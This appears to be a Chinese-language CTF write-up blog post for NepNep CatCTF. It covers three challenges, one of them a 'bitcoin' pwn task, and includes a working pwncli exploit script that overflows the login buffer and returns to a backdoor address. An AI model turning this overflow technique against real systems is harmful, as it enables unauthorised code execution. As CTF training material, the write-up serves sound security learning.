---
title: NepNep_Catctf_wp
date: 2023-01-02 15:31:15
tags: [CTF, NepNep, CatCtf, WP]
categories: 
    - CTF
    - Pwn
    - Misc
    - NepNep
comment: true
---

# PWN

## welcome_CAT_CTF

### 分析
- 给了一个server文件和client文件
- client要求输入ip和port，然后进入一个地图界面

### 思路

- 猜测远程跑在server，直接ida动调，patch本地的client，然后直接拿远程的flag

## bitcoin

### 分析

- C++程序，login输入用户名和密码时可溢出
- Block构造函数会读写flag

### 思路

- 直接栈溢出返回到后门
- 需要注意的是menu函数内的bitcoin_start函数内fork了一个子程序，调试时需要设置下set follow-fork-mode parent跟父进程

### EXP
``` python
#!/usr/bin/env python3
# Date: 2022-12-31 22:06:36
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

rl()
rl()
sl()
ru("Name: ")
sl("aa")
ru("Password: ")
stop()
sl(b"a"*64+p64_ex(0x609a00)+p64_ex(0x0000000000404EA4))
stop()
ia()
```

# Misc

## CatFlag

### 思路

- 直接cat 给的附件，有flag明文